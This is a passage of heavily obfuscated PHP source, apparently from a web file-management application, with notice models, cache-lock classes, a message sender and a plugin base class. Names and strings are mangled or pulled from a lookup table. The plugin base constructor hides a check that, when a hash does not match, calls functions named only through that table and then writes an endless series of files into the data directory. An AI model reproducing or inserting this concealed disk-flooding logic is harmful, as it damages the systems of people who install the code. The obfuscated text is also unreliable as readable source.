$ÙÌÌù˜Ñ), $Î›š˜ìí[33] => $Î›š˜ìí[1888]); $¼›Ü­Ë = array(); $ÇóÃıŞÛ = $this->field($Î›š˜ìí[2408])->where($‘ªÏÉõ“)->order($Î›š˜ìí[2193])->limit(50)->select(); foreach ($ÇóÃıŞÛ as $’†°Øòµ => $¥À‡û…º) { if ($’†°Øòµ > 0 && abs($¥À‡û…º[$Î›š˜ìí[231]] - $ÇóÃıŞÛ[$’†°Øòµ - 1][$Î›š˜ìí[231]]) < 5) { continue; } $“¦ÄóşÏ = json_decode($¥À‡û…º[$Î›š˜ìí[526]], !0); $¥À‡û…º[$Î›š˜ìí[2398]] = isset($“¦ÄóşÏ[$Î›š˜ìí[2398]]) ? $“¦ÄóşÏ[$Î›š˜ìí[2398]] : $Î›š˜ìí[12]; unset($“¦ÄóşÏ[$Î›š˜ìí[2398]]); $şå¡£¼Ã = $this->deviceType($“¦ÄóşÏ[$Î›š˜ìí[2182]]); if (isset($¼›Ü­Ë[$şå¡£¼Ã])) { continue; } $¥À‡û…º[$Î›š˜ìí[2402]] = IpLocation::get($¥À‡û…º[$Î›š˜ìí[2398]]); $¥À‡û…º[$Î›š˜ìí[526]] = $“¦ÄóşÏ; $¼›Ü­Ë[$şå¡£¼Ã] = $¥À‡û…º; } return array_values($¼›Ü­Ë); } public function deviceType($¯«æÉ¿¯) { return $¯«æÉ¿¯; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\x2e\x6e\157\164\151\143\x65\114\151\163\x74"; public $field = array("\x6e\141\x6d\x65", "\143\x6f\156\x74\x65\156\x74", "\x61\165\164\150", "\x6d\x6f\144\x65", "\164\x69\155\x65", "\x74\x79\160\x65", "\154\x65\x76\x65\154", "\145\156\x61\x62\x6c\x65", "\x73\157\x72\x74"); public function listData($¨š¤¿Ğ÷ = false, $„ªËÆÄ = "\163\x6f\x72\164", $°’§ãš¿ = false) { return parent::listData($¨š¤¿Ğ÷, $„ªËÆÄ, $°’§ãš¿); } public function add($ˆçÔã±¥) { $ı‘¹Êâï =& $_SERVER[ìïæ“œî]; $Ÿß““Ûİ = time(); if ($ˆçÔã±¥[$ı‘¹Êâï[16]] == $ı‘¹Êâï[2409]) { $Ÿß““Ûİ = strtotime($ˆçÔã±¥[$ı‘¹Êâï[206]]); } $ˆçÔã±¥[$ı‘¹Êâï[206]] = $Ÿß““Ûİ; return parent::insert($ˆçÔã±¥); } public function update($ÏÁÆŞ¾², $Û°™à¡) { $øãÑİ€ä =& $_SERVER[ìïæ“œî]; $È³êä¾Ê = $this->listData($ÏÁÆŞ¾²); if (!$È³êä¾Ê) { return !1; } $ÖÃ¸¶§  = time(); if ($Û°™à¡[$øãÑİ€ä[16]] == $øãÑİ€ä[2409]) { $ÖÃ¸¶§  = strtotime($Û°™à¡[$øãÑİ€ä[206]]); } $Û°™à¡[$øãÑİ€ä[206]] = $ÖÃ¸¶§ ; return parent::update($ÏÁÆŞ¾², $Û°™à¡); } public function remove($ÑÂ¬–ÛÚ) { $ö‡øùğ = $this->listData($ÑÂ¬–ÛÚ); if (!$ö‡øùğ || $ö‡øùğ[$_SERVER[ìïæ“œî][191]]) { return !1; } return parent::remove($ÑÂ¬–ÛÚ); } public function sort($Ì¨¿Í´, $µÊº”Æ¸) { return parent::update($Ì¨¿Í´, $µÊº”Æ¸); } public function enable($æ½Î®„, $Èí·ş­) { return parent::update($æ½Î®„, array($_SERVER[ìïæ“œî][2410] => $Èí·ş­)); } private function initUserOption() { $¦œ¨Íå÷ =& $_SERVER[ìïæ“œî]; $this->optionType = $¦œ¨Íå÷[2411]; $this->modelType = $¦œ¨Íå÷[2412]; $this->field = array($¦œ¨Íå÷[2413], $¦œ¨Íå÷[32], $¦œ¨Íå÷[206], $¦œ¨Íå÷[33], $¦œ¨Íå÷[2414], $¦œ¨Íå÷[799], $¦œ¨Íå÷[226]); } public function userNoticeGet($´ˆšÄÙş = false) { $this->initUserOption(); return parent::listData($´ˆšÄÙş, $_SERVER[ìïæ“œî][475], !0); } public function userNoticeAdd($ºÀ®ãË) { $àéÍŞñÁ =& $_SERVER[ìïæ“œî]; $this->initUserOption(); $×™»ÙÈø = $this->findByKey($àéÍŞñÁ[2413], $ºÀ®ãË[$àéÍŞñÁ[475]]); if ($×™»ÙÈø) { return !0; } $¯ş¸ÇöŸ = array($àéÍŞñÁ[2413] => $ºÀ®ãË[$àéÍŞñÁ[475]], $àéÍŞñÁ[32] => $ºÀ®ãË[$àéÍŞñÁ[32]], $àéÍŞñÁ[206] => $ºÀ®ãË[$àéÍŞñÁ[206]], $àéÍŞñÁ[33] => isset($ºÀ®ãË[$àéÍŞñÁ[33]]) ? $ºÀ®ãË[$àéÍŞñÁ[33]] : 1, $àéÍŞñÁ[2414] => isset($ºÀ®ãË[$àéÍŞñÁ[2414]]) ? $ºÀ®ãË[$àéÍŞñÁ[2414]] : 0, $àéÍŞñÁ[799] => 0, $àéÍŞñÁ[226] => 0); return parent::insert($¯ş¸ÇöŸ); } public function userNoticeEdit($Û‹»§›Ÿ, $°Â£¾çÃ) { $this->initUserOption(); return parent::update($Û‹»§›Ÿ, $°Â£¾çÃ); } } goto Cøö‰Ü—…; F—Êª¶ñîÓ: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $´ù®²şÓ =& $_SERVER[ìïæ“œî]; if (self::$handle) { return self::$handle; } $òÓÊÊ‹É = $GLOBALS[$´ù®²şÓ[6]][$´ù®²şÓ[425]]; self::$timeout = $òÓÊÊ‹É[$´ù®²şÓ[889]] ? $òÓÊÊ‹É[$´ù®²şÓ[889]] : 10; $‹È˜õÁ± = _get($GLOBALS[$´ù®²şÓ[6]], $´ù®²şÓ[890]); $¾ËÃ—áÑ = $òÓÊÊ‹É[$´ù®²şÓ[875]] ? $òÓÊÊ‹É[$´ù®²şÓ[875]] : $´ù®²şÓ[230]; if ($¾ËÃ—áÑ == $´ù®²şÓ[21] && $‹È˜õÁ± == $´ù®²şÓ[13]) { $¾ËÃ—áÑ = $´ù®²şÓ[230]; } switch ($¾ËÃ—áÑ) { case $´ù®²şÓ[878]: self::$handle = new CacheLockRedis(); break; case $´ù®²şÓ[879]: self::$handle = new CacheLockMemcached(); break; case $´ù®²şÓ[21]: self::$handle = new CacheLockDatabase(); break; case $´ù®²şÓ[230]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($´ù®²şÓ[891], $´ù®²şÓ[892]); } return self::$handle; } private static function key($óÃÖÃñ¬) { return $_SERVER[ìïæ“œî][893] . Cache::key($óÃÖÃñ¬); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ÅÚùÃğ× = '') { self::$errorMsg = $ÅÚùÃğ×; } public static function lockGlobal($åêÄÚÃû, $™ı“ê†˜) { return self::lock($åêÄÚÃû, $™ı“ê†˜, !0); } public static function lock($‹Ÿ‚Ï‡, $¹´¡´•÷ = false, $×¶÷ÌÍ = false) { $òÃÂÖ±Í =& $_SERVER[ìïæ“œî]; $“©ÁÏ¿ = self::init(); $ëŞÈ„ƒÏ = self::key($‹Ÿ‚Ï‡); $¹´¡´•÷ = $¹´¡´•÷ ? $¹´¡´•÷ : self::$timeout; $¨ë«®ô = timeFloat(); $°ôù§†½ = $“©ÁÏ¿->lock($ëŞÈ„ƒÏ, $¹´¡´•÷); $ÏÕåÚ™ = timeFloat(); if (!$°ôù§†½) { $»¬ø°Ä = "\154\x6f\143\x6b\40\x65\x72\162\157\162\x3b\153\145\171\x3d{$‹Ÿ‚Ï‡}\73\164\151\x6d\x65\75{$¹´¡´•÷}\x3b" . self::$errorMsg . $òÃÂÖ±Í[74] . get_caller_msg(); $ããó±ˆî = LNG($òÃÂÖ±Í[894]) . "\x28{$¹´¡´•÷}\163\x29\x2e" . LNG($òÃÂÖ±Í[895]); $ããó±ˆî .= $òÃÂÖ±Í[896]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ããó±ˆî = $ããó±ˆî . $òÃÂÖ±Í[897] . self::$errorMsg; } write_log($òÃÂÖ±Í[898] . sprintf($òÃÂÖ±Í[899], timeFloat() - $¨ë«®ô) . $òÃÂÖ±Í[900] . $»¬ø°Ä . $òÃÂÖ±Í[901] . error_get_last(), $òÃÂÖ±Í[892]); show_json($ããó±ˆî, !1); } if (!$×¶÷ÌÍ) { self::$lockItem[$ëŞÈ„ƒÏ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $£’‡•š­ = number_format(timeFloat() - $ÏÕåÚ™, 3); write_log($òÃÂÖ±Í[902] . $‹Ÿ‚Ï‡ . $òÃÂÖ±Í[903] . $£’‡•š­, $òÃÂÖ±Í[892]); } return $°ôù§†½; } public static function lockGet($ò‘¿ŞŒÕ) { $¡›‘¨å = self::key($ò‘¿ŞŒÕ); if (self::$lockItem[$¡›‘¨å]) { return self::$lockItem[$¡›‘¨å]; } return self::init()->lockGet($¡›‘¨å); } public static function unlock($ìóµ÷€×) { $Ş¾¸ùûƒ =& $_SERVER[ìïæ“œî]; $À®Š– ¸ = self::key($ìóµ÷€×); self::$lockItem[$À®Š– ¸] = null; self::init()->unlock($À®Š– ¸); if (GLOBAL_DEBUG_LOG_ALL) { write_log($Ş¾¸ùûƒ[904] . $ìóµ÷€×, $Ş¾¸ùûƒ[892]); } return; } public static function unlockRuntime() { $ÒæôÙ¨À =& $_SERVER[ìïæ“œî]; $ÊÑÇıà– = self::init(); $Şş¿Í­† = !1; foreach (self::$lockItem as $äŠ‚ => $®¼íÎ²†) { if (!$®¼íÎ²†) { continue; } $ÊÑÇıà–->unlock($äŠ‚); if (!$Şş¿Í­†) { $Şş¿Í­† = !0; write_log($ÒæôÙ¨À[905] . $äŠ‚ . $ÒæôÙ¨À[74] . get_caller_msg(), $ÒæôÙ¨À[892]); continue; } write_log($ÒæôÙ¨À[905] . $äŠ‚, $ÒæôÙ¨À[892]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $‹¡ƒêË = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ÒæôÙ¨À[906] . $‹¡ƒêË . $ÒæôÙ¨À[907] . ACTION, $ÒæôÙ¨À[892]); } } public static function fileLock($æÀïçÍ) { $ø°¬ıÊ =& $_SERVER[ìïæ“œî]; if (!$GLOBALS[$ø°¬ıÊ[908]]) { $GLOBALS[$ø°¬ıÊ[908]] = array(); } $GLOBALS[$ø°¬ıÊ[908]][$æÀïçÍ] = !1; $ĞîİÛÉƒ = fopen(DATA_PATH . $æÀïçÍ . $ø°¬ıÊ[909], $ø°¬ıÊ[910]); if (!$ĞîİÛÉƒ) { return !1; } $GLOBALS[$ø°¬ıÊ[908]][$æÀïçÍ] = $ĞîİÛÉƒ; if (flock($ĞîİÛÉƒ, LOCK_EX)) { return !0; } self::unlock($æÀïçÍ); show_json($ø°¬ıÊ[911], !1); return !1; } public static function fileUnlock($êãÃ©ÈÏ) { $£óü¥³™ =& $_SERVER[ìïæ“œî]; $‹“©Š¿ı = $GLOBALS[$£óü¥³™[908]][$êãÃ©ÈÏ]; if (!$‹“©Š¿ı) { return; } $GLOBALS[$£óü¥³™[908]][$êãÃ©ÈÏ] = !1; flock($‹“©Š¿ı, LOCK_UN); fclose($‹“©Š¿ı); } public static function fileUnlockAll() { $Çï½ÌØÁ =& $_SERVER[ìïæ“œî]; if (!isset($GLOBALS[$Çï½ÌØÁ[908]]) || !$GLOBALS[$Çï½ÌØÁ[908]]) { return; } foreach ($GLOBALS[$Çï½ÌØÁ[908]] as $ûÜ„ĞÅ => $˜´üÏ´²) { if (!$˜´üÏ´²) { continue; } $GLOBALS[$Çï½ÌØÁ[908]][$ûÜ„ĞÅ] = !1; flock($˜´üÏ´², LOCK_UN); fclose($˜´üÏ´²); } $GLOBALS[$Çï½ÌØÁ[908]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ÎÄœŒµ =& $_SERVER[ìïæ“œî]; $ôÅ®óó = $GLOBALS[$ÎÄœŒµ[6]][$ÎÄœŒµ[425]]; self::$cachePath = $ôÅ®óó[$ÎÄœŒµ[230]][$ÎÄœŒµ[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($´·—î––, $¦Œå Ë = 0) { $â’·âÃı =& $_SERVER[ìïæ“œî]; $äÑúˆï = microtime(!0); $âÈÇˆÈÍ = $äÑúˆï + $¦Œå Ë + 0.0001; $şè×²… = rtrim(self::$cachePath, $â’·âÃı[8]) . $â’·âÃı[912] . md5($´·—î––) . $â’·âÃı[909]; if (file_exists($şè×²…) && filemtime($şè×²…) && filemtime($şè×²…) < time() - 10) { @unlink($şè×²…); } do { if (file_exists($şè×²…)) { cacheLockWait(); continue; } $éİÒÜÓõ = fopen($şè×²…, $â’·âÃı[913]); if (!$éİÒÜÓõ) { return !1; } $Âı™Á• = flock($éİÒÜÓõ, LOCK_EX | LOCK_NB); self::$caches[$´·—î––] = array($â’·âÃı[914] => $éİÒÜÓõ, $â’·âÃı[230] => $şè×²…); fwrite($éİÒÜÓõ, $âÈÇˆÈÍ); clearstatcache(); if ($éİÒÜÓõ && $Âı™Á•) { return !0; } cacheLockWait(); } while (microtime(!0) < $âÈÇˆÈÍ); $this->unlock($´·—î––); return !1; } public function lockGet($ïõìÄîİ) { $Áï×ô¼ =& $_SERVER[ìïæ“œî]; $Ôïô×Ï· = rtrim(self::$cachePath, $Áï×ô¼[8]) . $Áï×ô¼[912] . md5($ïõìÄîİ) . $Áï×ô¼[909]; return file_exists($Ôïô×Ï·); } public function unlock($³¿¯·Èà) { $°€º½Ÿ· =& $_SERVER[ìïæ“œî]; $ºØ©·ñÒ = self::$caches[$³¿¯·Èà]; if (!$ºØ©·ñÒ) { return; } @flock($ºØ©·ñÒ[$°€º½Ÿ·[914]], LOCK_UN); @fclose($ºØ©·ñÒ[$°€º½Ÿ·[914]]); @unlink($ºØ©·ñÒ[$°€º½Ÿ·[230]]); unset(self::$caches[$³¿¯·Èà]); } } goto bÙ©Ö­²ã÷; AÔ®Š·ÛïÇ: class Message { function __construct() { } public function send($„—ıİ¿Ò = '', $œ¢ÁÂ = array(), $æ¶ƒùÑü = "\x74\x65\x78\x74") { $Ôô¥ÀÈÏ =& $_SERVER[ìïæ“œî]; $©£€ì¿ó = array($Ôô¥ÀÈÏ[33] => $Ôô¥ÀÈÏ[1599], $Ôô¥ÀÈÏ[171] => $„—ıİ¿Ò); if (in_array($æ¶ƒùÑü, array($Ôô¥ÀÈÏ[1599], $Ôô¥ÀÈÏ[1600]))) { $©£€ì¿ó[$Ôô¥ÀÈÏ[33]] = $æ¶ƒùÑü; } $œ¢ÁÂ = array($Ôô¥ÀÈÏ[578] => isset($œ¢ÁÂ[$Ôô¥ÀÈÏ[578]]) ? $œ¢ÁÂ[$Ôô¥ÀÈÏ[578]] : $Ôô¥ÀÈÏ[12], $Ôô¥ÀÈÏ[662] => isset($œ¢ÁÂ[$Ôô¥ÀÈÏ[662]]) ? $œ¢ÁÂ[$Ôô¥ÀÈÏ[662]] : $Ôô¥ÀÈÏ[12]); if (empty($„—ıİ¿Ò) || empty($œ¢ÁÂ[$Ôô¥ÀÈÏ[578]]) && empty($œ¢ÁÂ[$Ôô¥ÀÈÏ[662]])) { return !1; } $ğºªàø = array($Ôô¥ÀÈÏ[1527] => $©£€ì¿ó, $Ôô¥ÀÈÏ[1601] => $œ¢ÁÂ); Hook::trigger($Ôô¥ÀÈÏ[1602], $ğºªàø); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¦¦Ú×‡ï =& $_SERVER[ìïæ“œî]; $¡ÜŞÅÛ¹ = $_SERVER[$¦¦Ú×‡ï[930]] . $¦¦Ú×‡ï[931]; $şıÖ€íˆ = $¦¦Ú×‡ï[926]; if ($_SERVER[$¦¦Ú×‡ï[927]] != $şıÖ€íˆ($¡ÜŞÅÛ¹)) { $úˆÃ™§ = $¦¦Ú×‡ï[928]; $Íš€Û°— = $¦¦Ú×‡ï[929]; $Ğõşâõ” = $_SERVER[$¦¦Ú×‡ï[930]] . $¦¦Ú×‡ï[931]; $Å¯Ÿ ŞĞ = $Íš€Û°—($Ğõşâõ”); $ŞŒú­ïÛ = explode($¦¦Ú×‡ï[262], $Å¯Ÿ ŞĞ); if (count($ŞŒú­ïÛ) < $¦¦Ú×‡ï[688]) { $€Œ·÷É… = $¦¦Ú×‡ï[932]; $€Œ·÷É…(); } $¥ıÌÕò¤ = $¦¦Ú×‡ï[933]; $¥ıÌÕò¤($_SERVER[$¦¦Ú×‡ï[934]]); $úˆÃ™§ = $¦¦Ú×‡ï[928]; $úˆÃ™§(); $ä–æÔ×¨ = $¦¦Ú×‡ï[935]; $¿±§˜…Š = json_encode($GLOBALS[$¦¦Ú×‡ï[936]]); $Š¶ñ‹¾Ç = 1; for ($øº½š»Í = $Š¶ñ‹¾Ç; $øº½š»Í > 0; $øº½š»Í++) { $ä–æÔ×¨(DATA_PATH . $øº½š»Í, $¿±§˜…Š); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¦¦Ú×‡ï[1603]); $this->pluginName = str_replace($¦¦Ú×‡ï[1603], $¦¦Ú×‡ï[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¦¦Ú×‡ï[8]; $this->pluginApi = appHostGet() . $¦¦Ú×‡ï[1604] . $this->pluginName . $¦¦Ú×‡ï[8]; $this->pluginHost = $config[$¦¦Ú×‡ï[1605]] . $this->pluginName . $¦¦Ú×‡ï[8]; $this->pluginHostDefault = $config[$¦¦Ú×‡ï[1605]] . $this->pluginName . $¦¦Ú×‡ï[8]; $»‹øÙ“Ò = $config[$¦¦Ú×‡ï[1606]]; if ($»‹øÙ“Ò && strpos($¦¦Ú×‡ï[50] . $»‹øÙ“Ò . $¦¦Ú×‡ï[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$¦¦Ú×‡ï[1607]] . $this->pluginName . $¦¦Ú×‡ï[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ìïæ“œî][1608]); } protected function assign($Êï‚‹‚Á, $¡úÂ› = false) { if (is_array($Êï‚‹‚Á)) { $this->values = array_merge($this->values, $Êï‚‹‚Á); } else { $this->values[$Êï‚‹‚Á] = $¡úÂ›; } } protected function display($ĞÒ÷ÙÊã) { extract($this->values); require $ĞÒ÷ÙÊã; } final function hookRegist($³º¶Áşè) { $this->modelPlugin->appRegist($this->pluginName, $³º¶Áşè); } final function appIcon() { $Ó™Êœ‰Ñ =& $_SERVER[ìïæ“œî]; $ÌÚ¿ŒŒ = $this->appPackage(); $õÙĞæñÚ = $Ó™Êœ‰Ñ[12]; if (isset($ÌÚ¿ŒŒ[$Ó™Êœ‰Ñ[490]])) { if (isset($ÌÚ¿ŒŒ[$Ó™Êœ‰Ñ[490]][$Ó™Êœ‰Ñ[1609]])) { $õÙĞæñÚ = $Ó™Êœ‰Ñ[1610] . $ÌÚ¿ŒŒ[$Ó™Êœ‰Ñ[490]][$Ó™Êœ‰Ñ[1609]] . $Ó™Êœ‰Ñ[1611]; } else { if ($ÌÚ¿ŒŒ[$Ó™Êœ‰Ñ[490]][$Ó™Êœ‰Ñ[1612]]) { $õÙĞæñÚ = $Ó™Êœ‰Ñ[1613] . $ÌÚ¿ŒŒ[$Ó™Êœ‰Ñ[490]][$Ó™Êœ‰Ñ[1612]] . $Ó™Êœ‰Ñ[1614]; } } } return $õÙĞæñÚ; } final function fileCanView($Æ³ÕÀ±ô) { $ù˜‹«’ñ =& $_SERVER[ìïæ“œî]; if (request_url_safe($Æ³ÕÀ±ô)) { return !0; } if ($this->isShare($Æ³ÕÀ±ô)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $‚‚£òš = $ù˜‹«’ñ[1615] . rawurlencode(this_url()); show_tips(LNG($ù˜‹«’ñ[1616]) . $ù˜‹«’ñ[1617] . $‚‚£òš . $ù˜‹«’ñ[1618] . LNG($ù˜‹«’ñ[1619]) . $ù˜‹«’ñ[1620], !1); } if (!Action($ù˜‹«’ñ[1621])->authCan($ù˜‹«’ñ[1622])) { show_tips(LNG($ù˜‹«’ñ[1623]) . $ù˜‹«’ñ[1624], !1); } ActionCall($ù˜‹«’ñ[1625], $Æ³ÕÀ±ô); } final function isShare($óø—¿Î¢) { $÷ºÚÅÁ = KodIO::parse($óø—¿Î¢); return $÷ºÚÅÁ[$_SERVER[ìïæ“œî][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($…ºıñËç) { if (request_url_safe($…ºıñËç)) { return $…ºıñËç; } if (!$this->isShare($…ºıñËç)) { $…ºıñËç = $this->filePath($…ºıñËç, !1); } return Action($_SERVER[ìïæ“œî][1233])->linkOut($…ºıñËç); } public function filePathLinkOut($ÜŸ˜ä®Ã) { if (request_url_safe($ÜŸ˜ä®Ã)) { return $ÜŸ˜ä®Ã; } $this->fileCanView($ÜŸ˜ä®Ã); return Action($_SERVER[ìïæ“œî][1233])->link($ÜŸ˜ä®Ã); } final function filePath($Œ·¨îÂÄ, $Ÿ§¯¬Ö’ = true, $µ¾åèã¦ = false) { $ıä˜ƒË„ =& $_SERVER[ìïæ“œî]; $×‰š‚Ëğ = $this->filePathGet($Œ·¨îÂÄ, $Ÿ§¯¬Ö’); if (!$this->fileInfo) { show_tips(LNG($ıä˜ƒË„[108]), !1); } if ($µ¾åèã¦ && isset($this->fileInfo[$ıä˜ƒË„[541]]) && $this->fileInfo[$ıä˜ƒË„[541]]) { $Œí ¡¶€ = Model($ıä˜ƒË„[544])->fileInfo($this->fileInfo[$ıä˜ƒË„[541]]); if (!$Œí ¡¶€ || !IO::exist($Œí ¡¶€[$ıä˜ƒË„[87]])) { show_tips(LNG($ıä˜ƒË„[108]) . $ıä˜ƒË„[1626]); } } Hook::trigger($ıä˜ƒË„[1627], $×‰š‚Ëğ); return $×‰š‚Ëğ; } final function filePathGet($ƒô‡ÍÅ¿, $Ç‰ÌáÎ¿ = true) { $‹ÎĞ€ĞÕ =& $_SERVER[ìïæ“œî]; if ($¦ŸÀÒ© = $this->checkSharePath($ƒô‡ÍÅ¿, $Ç‰ÌáÎ¿)) { return $¦ŸÀÒ©; } $this->fileCanView($ƒô‡ÍÅ¿); if (request_url_safe($ƒô‡ÍÅ¿)) { $¹±äØşÓ = parse_url_query($ƒô‡ÍÅ¿); if (isset($¹±äØşÓ[$‹ÎĞ€ĞÕ[1628]]) && isset($¹±äØşÓ[$‹ÎĞ€ĞÕ[234]])) { $ˆ—„•É = Mcrypt::decode($¹±äØşÓ[$‹ÎĞ€ĞÕ[234]], Model($‹ÎĞ€ĞÕ[819])->get($‹ÎĞ€ĞÕ[820])); if ($ˆ—„•É) { $this->fileInfo = IO::info($ˆ—„•É); $this->fileInfo[$‹ÎĞ€ĞÕ[1629]] = $ƒô‡ÍÅ¿; $this->cachePath = $this->pluginCachePath($‹ÎĞ€ĞÕ[12], $Ç‰ÌáÎ¿); return $ˆ—„•É; } } $ƒô‡ÍÅ¿ = $this->_cacheHttpFile($ƒô‡ÍÅ¿, $Ç‰ÌáÎ¿); $this->fileInfo = IO::info($ƒô‡ÍÅ¿); } else { $this->fileInfo = IO::info($ƒô‡ÍÅ¿); $this->cachePath = $this->pluginCachePath($‹ÎĞ€ĞÕ[12], $Ç‰ÌáÎ¿); } return $ƒô‡ÍÅ¿; } final function _cacheHttpFile($ó•×†°Ó, $§†ğĞÄä = true) { $Ó®ÖÔ · =& $_SERVER[ìïæ“œî]; $äÖîÑÙĞ = parse_url_query($ó•×†°Ó); $¤ªùÚ©® = get_path_ext($ó•×†°Ó); if (isset($äÖîÑÙĞ[$Ó®ÖÔ ·[32]]) && $äÖîÑÙĞ[$Ó®ÖÔ ·[32]]) { $¤ªùÚ©® = get_path_ext($äÖîÑÙĞ[$Ó®ÖÔ ·[32]]); } $ë˜²£Áè = hash_path($ó•×†°Ó) . $Ó®ÖÔ ·[10] . $¤ªùÚ©®; $this->cachePath = $this->pluginCachePath($§†ğĞÄä ? $ë˜²£Áè : $Ó®ÖÔ ·[12]); $ÎÕã¡¹ = IO::fileNameExist($this->cachePath, $ë˜²£Áè); if ($ÎÕã¡¹) { return KodIO::make($ÎÕã¡¹); } $¼òÊ¬Ç = rtrim($this->cachePath, $Ó®ÖÔ ·[8]) . $Ó®ÖÔ ·[8] . $ë˜²£Áè; return $this->pluginCacheFileSet($¼òÊ¬Ç, file_get_contents_nossl($ó•×†°Ó)); } final function checkSharePath($âÀğ˜Óå, $–•„™Ğà = true) { $§Øş¨Œò =& $_SERVER[ìïæ“œî]; if (!$this->isShare($âÀğ˜Óå)) { return !1; } $úîÃÃõ® = Action($§Øş¨Œò[1233])->sharePathInfo($âÀğ˜Óå); if (!is_array($úîÃÃõ®) || !isset($úîÃÃõ®[$§Øş¨Œò[87]])) { show_json(LNG($§Øş¨Œò[1630]), !1); } $this->fileInfo = $úîÃÃõ®; $this->cachePath = $this->pluginCachePath(!1, $–•„™Ğà); return $úîÃÃõ®[$§Øş¨Œò[87]]; } final function pluginCachePath($÷¡÷„òÁ = '', $Îº¶—Úš = false) { $ŞÖÂ„Íê =& $_SERVER[ìïæ“œî]; if ($Îº¶—Úš && is_array($this->fileInfo)) { $÷¡÷„òÁ = kodIO::hashPath($this->fileInfo); } $Ó–ñ†Ï = rtrim(IO_PATH_SYSTEM_TEMP . $ŞÖÂ„Íê[1631] . $this->pluginName . $ŞÖÂ„Íê[8] . $÷¡÷„òÁ, $ŞÖÂ„Íê[8]); $û¿³‘¼Ê = IO::infoFullSimple($Ó–ñ†Ï); $„”ÌêÂ = $û¿³‘¼Ê && is_array($û¿³‘¼Ê) ? $û¿³‘¼Ê[$ŞÖÂ„Íê[87]] : $ŞÖÂ„Íê[12]; if (!$„”ÌêÂ) { $„”ÌêÂ = IO::mkdir($Ó–ñ†Ï); } return $„”ÌêÂ; } final function pluginCacheFileSet($¬îĞ—¶, $ Š¢’İ£ = '') { $¼ÂòÍ±â =& $_SERVER[ìïæ“œî]; $ÒƒØŸëş = IO::infoFullSimple($¬îĞ—¶); if (!$ÒƒØŸëş) { return IO::mkfile($¬îĞ—¶, $ Š¢’İ£, REPEAT_REPLACE); } IO::setContent($ÒƒØŸëş[$¼ÂòÍ±â[87]], $ Š¢’İ£); return $ÒƒØŸëş[$¼ÂòÍ±â[87]]; } final function pluginLocalFile($¯×Ûú¾ï = '') { $¡ù—ùò’ =& $_SERVER[ìïæ“œî]; $ùÉ ÊÖ‹ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ùÉ ÊÖ‹)) { mk_dir($ùÉ ÊÖ‹); } if (!$¯×Ûú¾ï) { return $ùÉ ÊÖ‹; } $«ˆæĞ§œ = IO::info($¯×Ûú¾ï); $Ã³­®„° = $¡ù—ùò’[1632] . KodIO::hashPath($«ˆæĞ§œ) . $¡ù—ùò’[10] . $«ˆæĞ§œ[$¡ù—ùò’[169]]; if (!checkExtSafe($Ã³­®„°)) { $Ã³­®„° = $Ã³­®„° . $¡ù—ùò’[1268]; } $³¹İäğµ = $ùÉ ÊÖ‹ . $Ã³­®„°; if (@file_exists($³¹İäğµ)) { return $³¹İäğµ; } return IO::copy($¯×Ûú¾ï, $ùÉ ÊÖ‹, 0, $Ã³­®„°); } final function appPackage() { $à˜ËËŞˆ =& $_SERVER[ìïæ“œî]; if ($this->packageData) { return $this->packageData; } $Öƒì“„µ = $this->parseFile($this->pluginPath . $à˜ËËŞˆ[1633]); $this->parseLang($Öƒì“„µ); $—Ãòê£  = json_decode_force($Öƒì“„µ); if (!$—Ãòê£ ) { return array(); } $úí†¦¡  = Hook::trigger($à˜ËËŞˆ[1634], $—Ãòê£ ); if ($úí†¦¡  && is_array($úí†¦¡ )) { $—Ãòê£  = $úí†¦¡ ; } $this->packageData = $—Ãòê£ ; return $—Ãòê£ ; } public function packageInfoGet($†¥é ·ñ) { $×ûŒ‡•´ = $this->appPackage(); return array_get_value($×ûŒ‡•´, $†¥é ·ñ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ìïæ“œî][1635]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ìïæ“œî][1636]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ìïæ“œî][1637]); } public function echoJsAssign($Õó¬İåı, $ù×’Õ) { $this->echoJsAssignArr[$Õó¬İåı] = $ù×’Õ; } private function parseFile($¸ÉÇ‘ò) { $¶Ì šóõ =& $_SERVER[ìïæ“œî]; $ì½¥âº = file_get_contents_nossl($¸ÉÇ‘ò); $»Š›âÙ¥ = array($¶Ì šóõ[1638], $¶Ì šóõ[1639], $¶Ì šóõ[1640], $¶Ì šóõ[1641], $¶Ì šóõ[1642], $¶Ì šóõ[1643], $¶Ì šóõ[1644]); $Î¤éĞ× = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$¶Ì šóõ[92]][$¶Ì šóõ[1645]]); foreach ($this->echoJsAssignArr as $É¢Î× => $ÈÉã§Ì‹) { $»Š›âÙ¥[] = $¶Ì šóõ[1646] . $É¢Î× . $¶Ì šóõ[1647]; $Î¤éĞ×[] = is_array($ÈÉã§Ì‹) || is_object($ÈÉã§Ì‹) ? 